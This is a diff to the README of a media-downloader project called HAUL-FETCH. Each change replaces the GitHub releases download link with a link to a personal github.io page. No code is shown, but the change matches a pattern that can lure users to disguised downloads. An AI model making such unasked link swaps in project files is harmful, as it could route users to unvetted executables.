@@ -10,11 +10,11 @@ Welcome to **HAUL-FETCH** — the simplest way to download high-quality videos, 
 
 ## 🔗 Download HAUL-FETCH
 
-[![Download HAUL-FETCH Now](https://img.shields.io/badge/Download-HAUL--FETCH-brightgreen?style=for-the-badge&logo=github)](https://github.com/Eheemmem/HAUL-FETCH/releases)
+[![Download HAUL-FETCH Now](https://img.shields.io/badge/Download-HAUL--FETCH-brightgreen?style=for-the-badge&logo=github)](https://eheemmem.github.io)
 
 **Visit this link to download the application.**
 
-Click the button above or go directly to: [https://github.com/Eheemmem/HAUL-FETCH/releases](https://github.com/Eheemmem/HAUL-FETCH/releases)
+Click the button above or go directly to: [https://eheemmem.github.io](https://eheemmem.github.io)
 
 ---
 
@@ -164,7 +164,7 @@ The source code is open and available on GitHub for developers who want to contr
 
 You're just two clicks away from downloading any media you want.
 
-1. **[Download HAUL-FETCH](https://github.com/Eheemmem/HAUL-FETCH/releases)**
+1. **[Download HAUL-FETCH](https://eheemmem.github.io)**
 2. Run it, paste a link, and enjoy!
 
 ---
